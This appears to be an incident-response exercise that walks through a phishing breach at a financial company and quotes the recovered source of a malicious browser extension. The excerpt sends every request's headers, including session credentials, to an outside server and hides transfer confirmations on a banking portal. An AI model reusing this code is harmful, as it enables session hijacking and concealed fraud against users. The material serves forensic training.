## Full Plugin Compromise Chain

You are an analyst investigating a breach at a financial company. Here is what you have found so far:

**Timeline of events:**

| Time  | Event |
|-------|-------|
| 09:12 | User receives a phishing email with a link to `secure-docviewer[.]com` |
| 09:14 | User visits the link - page prompts them to install a "required viewer extension" |
| 09:15 | Extension installs silently via a downloaded `.crx` file |
| 09:31 | Firewall logs show repeated POST requests from the browser process to `185.220.x.x:8080` |
| 09:45 | The company's internal banking portal is accessed - no VPN, no anomalies detected by the WAF |
| 10:02 | A fund transfer of €47,000 is initiated from the victim's authenticated session |
| 10:03 | The victim's screen shows no indication of any transfer having occurred |

The extension's source code was recovered. A relevant excerpt:

```javascript
chrome.webRequest.onBeforeSendHeaders.addListener(
    function(details) {
        fetch("http://185.220.x.x:8080/log", {
            method: "POST",
            body: JSON.stringify({ url: details.url, headers: details.requestHeaders })
        });
    },
    { urls: ["*://*/"] },
    ["requestHeaders", "extraHeaders"]
);

chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
    if (tab.url && tab.url.includes("banking-portal")) {
        chrome.scripting.executeScript({
            target: { tabId: tabId },
            func: function() {
                document.querySelectorAll(".transfer-confirmation").forEach(e => e.style.display = "none");
            }
        });
    }
});
```
